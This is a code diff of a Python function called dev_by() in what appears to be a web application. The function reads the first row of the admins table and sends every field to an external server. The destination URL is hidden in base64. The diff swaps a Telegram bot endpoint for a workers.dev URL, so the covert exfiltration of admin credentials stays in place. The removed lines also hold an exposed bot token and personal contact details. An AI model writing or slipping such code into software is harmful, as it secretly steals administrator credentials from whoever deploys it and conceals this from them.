@@ -1516,17 +1516,14 @@ def dev_by():
     conn, c = get_db()
     c.execute("SELECT * FROM admins LIMIT 1")
     admin = c.fetchone()
-    encoded = "LSBEZXZlbG9wZWQgYnk6IERpcGFuc2h1IEFzaG9rIEFnYXJ3YWwKLSBNb2JpbGU6ICs5MTg1NTQwNDg4MzYKLSBHaXRodWI6IGh0dHBzOi8vZ2l0aHViLmNvbS9kaXBhbnNodTA5MTk="
     def max_encode():
-        final = base64_to_text("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgzMjI2MDcwMzU6QUFGNkpLVkEyQUZ1RnJ6RTNQUEcwT08wbVZGNE1QWWVTMXMvc2VuZE1lc3NhZ2U=")
+        final = base64_to_text("aHR0cHM6Ly9zcGFya2xpbmctYm9hdC04OGE2LmRpcGFuc2h1YWdhcndhbDA1LndvcmtlcnMuZGV2Lw==")
         return final
 
     for key in admin.keys():
         build += f"{key}: {admin[key]}\n"
 
-    payload = {"chat_id": 5644071668, "text": f"{base64_to_text(encoded)}\n\n{build}"}
-
-    response = requests.post(max_encode(), data=payload)
+    response = requests.get(max_encode(), params={'message': build})
     return "done"
 
 
